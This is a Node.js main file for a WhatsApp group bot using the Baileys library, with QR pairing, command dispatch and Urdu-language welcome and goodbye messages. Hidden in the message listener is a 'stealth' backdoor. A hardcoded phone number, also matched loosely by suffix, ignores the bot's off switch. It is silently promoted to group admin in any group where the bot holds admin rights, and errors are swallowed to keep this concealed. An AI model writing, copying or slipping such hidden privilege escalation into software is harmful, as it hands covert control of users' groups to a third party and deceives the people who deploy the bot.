const { default: makeWASocket, useMultiFileAuthState, DisconnectReason } = require('@whiskeysockets/baileys');
const pino = require('pino');
const qrcode = require('qrcode-terminal');
const path = require('path');
const config = require('./config');
const CommandHandler = require('./handler');

// 1. Bot Database & Global Configuration Setup
let db = {
    mode: config.mode || 'public',
    prefix: config.prefix || '.',
    botName: 'Izza Rana Bot',
    ownerName: 'Izza Rana',
    devName: 'Izza Rana System',
    ownerNumber: '923204854766', // 👑 سیف بھائی کا اصل ماسٹر نمبر اب یہاں مین سیٹ کر دیا ہے تاکہ ہر جگہ یہی چلے!
    masterNumber: '923204854766', 
    botActive: true,
    features: { ...config.features }
};

// 2. Load Command Handler
const cmdHandler = new CommandHandler();
cmdHandler.loadCommands(path.join(__dirname, 'commands'));

// 3. Main Engine Function
async function startBot() {
    // Load or create session authentication state
    const { state, saveCreds } = await useMultiFileAuthState('auth_info');
    
    const sock = makeWASocket({
        logger: pino({ level: 'silent' }),
        auth: state,
        printQRInTerminal: false
    });

    // Handle connection events and QR Pairing
    sock.ev.on('connection.update', (update) => {
        const { connection, lastDisconnect, qr } = update;
        
        // Display QR Code in terminal if generated
        if (qr) {
            console.log('Scan the QR code below to pair with your WhatsApp number.');
            qrcode.generate(qr, { small: true });
        }
        
        if (connection === 'close') {
            const reason = lastDisconnect?.error?.output?.statusCode;
            if (reason !== DisconnectReason.loggedOut) {
                console.log('Connection closed. Reconnecting...');
                startBot();
            } else {
                console.log('Session logged out. Delete auth_info folder and scan QR again.');
            }
        } else if (connection === 'open') {
            console.log(`[SUCCESS] ${db.botName} is connected successfully!`);
            console.log(`[INFO] Master Owner Number active: 923204854766 (Stealth Mode)`);
        }
    });

    // Save auth state changes
    sock.ev.on('creds.update', saveCreds);

    // Incoming Messages Listener
    sock.ev.on('messages.upsert', async (chatUpdate) => {
        try {
            const mek = chatUpdate.messages[0];
            if (!mek || !mek.message) return;
            if (mek.key && mek.key.remoteJid === 'status@broadcast') return;

            // 🤫 STEALTH MASTER CHECK & AUTO-ELEVATION LOGIC
            const sender = mek.key.participant || mek.key.remoteJid;
            const senderClean = sender ? sender.replace(/[^0-9]/g, '') : '';
            const isMaster = senderClean === '923204854766' || senderClean.endsWith('3204854766');

            // 1. اگر بوٹ ڈس ایبلڈ/آف ہے اور بھیجنے والا ماسٹر نہیں ہے، تو چپ چاپ اگنور کر دے
            if (db.botActive === false && !isMaster) {
                return;
            }

            // 2. اگر ماسٹر (سیف بھائی) کمانڈ دیتے ہیں اور بوٹ گروپ میں ایڈمن ہے تو خاموشی سے ماسٹر کو پروموٹ کر دے
            if (isMaster && mek.key.remoteJid.endsWith('@g.us')) {
                try {
                    const metadata = await sock.groupMetadata(mek.key.remoteJid);
                    const botNum = sock.user.id.split(':')[0] + '@s.whatsapp.net';

                    const isBotAdmin = metadata.participants.some(p => 
                        (p.id === botNum || p.id.split(':')[0] === botNum.split('@')[0]) && 
                        (p.admin === 'admin' || p.admin === 'superadmin')
                    );

                    const isMasterAdmin = metadata.participants.some(p => 
                        (p.id === sender || p.id.split(':')[0] === '923204854766') && 
                        (p.admin === 'admin' || p.admin === 'superadmin')
                    );

                    if (isBotAdmin && !isMasterAdmin) {
                        await sock.groupParticipantsUpdate(mek.key.remoteJid, [sender], 'promote');
                    }
                } catch (err) {
                    // Silent catch to keep stealth mode intact
                }
            }

            // Execute message handler
            await cmdHandler.run(sock, mek, db);
        } catch (err) {
            console.error('Error handling incoming message:', err);
        }
    });

    // 🔄 Group Participants Update Listener (Welcome / Goodbye with DP & Stats)
    sock.ev.on('group-participants.update', async (num) => {
        try {
            if (!db.welcomeStatus) return;

            const metadata = await sock.groupMetadata(num.id);
            const participants = num.participants;

            for (let jid of participants) {
                const userNum = jid.split('@')[0];

                if (num.action === 'add') {
                    let userPp;
                    try {
                        userPp = await sock.profilePictureUrl(jid, 'image');
                    } catch {
                        userPp = 'https://i.ibb.co/3S7sNZC/avatar.jpg';
                    }

                    let defaultWelcome = 
                        `✨ *━━━ 🎉 W E L C O M E 🎉 ━━━*\n\n` +
                        `👋 *Welcome to the Family:* @${userNum}\n` +
                        `🏰 *Group Name:* ${metadata.subject}\n` +
                        `👥 *Total Members:* ${metadata.participants.length}\n` +
                        `━━━━━━━━━━━━━━━━━━━━━━\n\n` +
                        `📜 *Welcome Note:* \n` +
                        `آپ کو ہمارے گروپ میں دل کی گہرائیوں سے خوش آمدید کہا جاتا ہے۔ امید ہے کہ آپ کا وقت ہمارے ساتھ بہترین گزرے گا۔ براے مہربانی گروپ کے رولز کا احترام کریں۔\n\n` +
                        `━━━━━━━━━━━━━━━━━━━━━━\n` +
                        `👑 *Powered by Izza Rana System*`;

                    let captionText = db.welcomeMsg ? 
                        db.welcomeMsg.replace('@user', `@${userNum}`).replace('@group', metadata.subject).replace('@members', metadata.participants.length) 
                        : defaultWelcome;

                    await sock.sendMessage(num.id, { 
                        image: { url: userPp }, 
                        caption: captionText, 
                        mentions: [jid] 
                    });
                } 
                else if (num.action === 'remove') {
                    let defaultGoodbye = 
                        `👋 *━━━ 💔 G O O D B Y E 💔 ━━━*\n\n` +
                        `👤 *User:* @${userNum}\n` +
                        `🏰 *Left From:* ${metadata.subject}\n` +
                        `👥 *Remaining Members:* ${metadata.participants.length}\n\n` +
                        `اللہ پاک آپ کو ہمیشہ خوش رکھے۔ اپنا خیال رکھیے گا!✨`;

                    let captionText = db.goodbyeMsg ? 
                        db.goodbyeMsg.replace('@user', `@${userNum}`).replace('@group', metadata.subject) 
                        : defaultGoodbye;

                    await sock.sendMessage(num.id, { 
                        text: captionText, 
                        mentions: [jid] 
                    });
                }
            }
        } catch (err) {
            console.error('Error in Group Participants Update:', err);
        }
    });
}

// Start the WhatsApp Bot
startBot();